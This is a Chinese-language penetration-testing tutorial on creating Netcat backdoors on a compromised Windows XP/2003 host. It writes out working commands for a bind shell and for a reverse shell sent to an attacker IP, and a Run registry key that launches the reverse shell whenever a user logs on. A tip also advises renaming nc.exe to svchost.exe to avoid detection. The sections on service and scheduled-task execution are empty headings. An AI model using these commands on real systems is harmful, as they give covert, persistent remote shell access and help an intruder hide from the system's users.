# **在 Windows XP / 2003 Server上创建Netcat后门**

​        Netcat的是一个多功能的工具，它可以执行多种TCP / IP功能。其中一个非常实用的功能，尤其是对于一个渗透测试人员，是建立从一个系统到另一个系统的shell。在本节中，我们将使用此功能来访问一台远程Windows XP系统上的后门。后门程序是一种通道，为我们提供了一个远程命令行到先前我们渗透到的系统中（受害者），使我们可以在之后的时间访问它。在本节中，我将演示多种的方式，来使用和创建后门在受害者的Windows XP主机上。



NOTE

通过远程协议，我们就拥有受害者主机的系统级访问权限( system-level access)，否则我们就要通过物理的方式访问主机，然后打开Windows的命令提示符。啊，无论是哪种方式，我们从受害者主机的命令行shell开始本节。



TIP

一旦，Netcat的后门程序被执行，它会在Windows的进程列表中显示出可执行文件的名字，所以，用netcat或者nc.exe来命名程序是不明智的。为了减少(lessen)你被一般的用户发现的几率(likelihood)，请查看系统上正在运行的进程列表，然后挑选一个来欺骗(spoof)。比如说，svchost.exe有多个运行的实例(multiple instances)，因此，如果你将nc.exe重命名为svchost.exe，一般的用户是不会看出有什么异常的(a normal user will not see anything unusual)。





为了达到演示的目的，在本节中，我会继续使用netcat和nc.exe这个名字。



## **后门连接方式**

我们有两种方法，可以提供一个通道到我们的netcat后门。我们可以从攻击端发起一个直连到后门，或者，我们可以从后门反向启动一个连接到我们的攻击端上运行的监听器。



### **直连到后门**

第一种访问后门的方法是，先让netcat执行在daemon模式下，监听入站连接。当后门在监听入站连接时，我们从攻击端发起(initiate)一个连接。在我们的攻击端到受害者端的连接被建立后，远程的shell就会反弹到攻击端系统上。下图就说明了这种方法。



![img](file:///var/folders/ry/6fdjy27j1cjb3dy3b6mwtc3h0000gn/T/WizNote/7160720a-620b-4885-a219-db69a0501307/index_files/618832511.png)



要设置这样的场景，我们需要了解执行和创建后门通道的命令。在漏洞利用的系统(受害端)上运行netcat的命令是：











 

```
c:\nc.exe -d -L -p 1234 -e cmd.exe
```









| Netcat选项 | 操作                                               |
| ---------- | -------------------------------------------------- |
| -d         | 从命令行分离开(detach)，后台模式执行**(非常靠谱)** |
| -L         | 持久监听，socket关闭后再次监听                     |
| -p 1234    | 本地端口号                                         |
| -e cmd.exe | 执行程序                                           |



#### **好处**

这种连接方式的好处是，一旦命令执行，你就可以在你想要的时间连接，无论好多次。

#### **缺陷**

这种链接方式的缺陷是，一旦命令执行，所有人都可以在他们想要的时间连接。这种连接方法将留下一个开放的后门，可能允许其他人的无意的系统级访问。另外，如果有一个分组过滤设备在受害主机和攻击端之前，你也许就不能建立起到后门的连接。



**WARNING**

如果对受害主机发起一个漏洞扫描(vulnerability scan)，而我们的后门在进行监听，它就会识别到收到的Windows shell，并且报告后门程序的漏洞。Nessus漏洞扫描器会正确识别我们的后门是一个安全漏洞(Security Hole)。











 

```
Nessus Results: 结果
      Security Hole  安全漏洞
      Search-agent (1234/tcp)     代理端 (1234/tcp)
      A shell seems to be running on this port! (This is a possible backdoor)  一个shell似乎运行在这个端口 (这可能是一个后门)
```









​        我们的目标是在受害者的主机上植入一个后门，我们不希望降低系统的安全性，并提供一个后门让系统给其他人使用。



### **从后门发起连接** 

第二个，也是更加常用的访问后门的方法是，让受害者的主机发起一个连接到我们的攻击端。在这个例子中，我们的攻击端让Netcat工作在监听模式下。受害主机在预先定义的端口上，创建一个连接到攻击端，并且发送命令行shell过来。下图展示了这种连接方式。





![img](file:///var/folders/ry/6fdjy27j1cjb3dy3b6mwtc3h0000gn/T/WizNote/7160720a-620b-4885-a219-db69a0501307/index_files/141140351.png)



在受害者主机运行的命令：









 

```
nc.exe -d host 1234 -e cmd.exe
```









| Netcat选项 | 操作                            |
| ---------- | ------------------------------- |
| -d         | 后台运行模式                    |
| host       | 连接的目标IP/host               |
| 1234       | 连接的目标端口号                |
| -e cmd.exe | 运行的程序(Windows 命令行shell) |



一旦后门执行，一个Windows的shell就会被发送回攻击端的监听器上，并且是运行后门的用户的权限。



#### **好处**

使用这种方法，Netcat连接将会穿过(traverse)分组过滤设备(Windows 防火墙)，除非出站过滤配置的非常到位(in place)，并且阻止了你建立连接使用的端口。为了避免这种情况，你可以使用Egress Firewall 扫描技术来找出，出站开放的端口号，来用于建立连接。

#### **弊端**

这种连接方式的一个缺点是，我们需要等待，一个事件(任务计划程序)或者是某种用户的行为(登录到系统或重新启动计算机)来触发(trigger)我们的后门，使其发起连接到我们的攻击端的监听器。

## **后门执行方式**



现在，我们已经有两种连接后门的方式了，我们需要一个事件或者特定的用户行为(user-specific action)来触发命令。在这节，我会介绍三种方法来执行我们的后门，这将会利用(utilize)我们刚刚讲到的，从受害者的主机发起连接到攻击端的连接方式。

### **使用注册表执行后门 / Executing the Backdoor using a Registry Entry**

第一种我们用来触发后门连接的方法是，把netcat命令添加到Windows的注册表项里。当用户登录上系统时，注册表中的具体位置，就会使目标触发Netcat命令(The specific location of the registry that we want to target will trigger our Netcat command when a user logs on to the system.)。假设你有受害主机的系统级访问权限，你就可以使用以下命令，来添加一个注册表键值：











 

```
c:\reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v nc /t REG_SZ /d
“c:\windows\nc.exe -d 192.168.1.70 1234 -e cmd.exe”
```





![img](file:///var/folders/ry/6fdjy27j1cjb3dy3b6mwtc3h0000gn/T/WizNote/7160720a-620b-4885-a219-db69a0501307/index_files/135620336.png)


好了，下一次，用户登录到系统的时候，netcat后门命令就会被触发，然后发送命令行shell到我们的攻击端。如图所示，域管理员(domain administrator)登录上我们的受害系统上，并且触发了后门，然后我们就收到了Windows的命令行提示符。





![img](file:///var/folders/ry/6fdjy27j1cjb3dy3b6mwtc3h0000gn/T/WizNote/7160720a-620b-4885-a219-db69a0501307/index_files/1988600792.png)



#### **好处**

当用户登录上受害主机后，后门就会被执行，和用户的相同权限的命令行就会被反弹到攻击端。这种方法可能会给我们一个域权限的shell。



#### **弊端**

如果我们使用后门的时候，主动断开，下一次，我们就必须等待用户注销系统，并重新登录，这样才能触发后门连接。

### **使用Windows服务执行后门**

#### 

#### **好处**



#### **弊端**



### 使用Windows任务计划执行后门



#### **好处**



### 后门执行的总结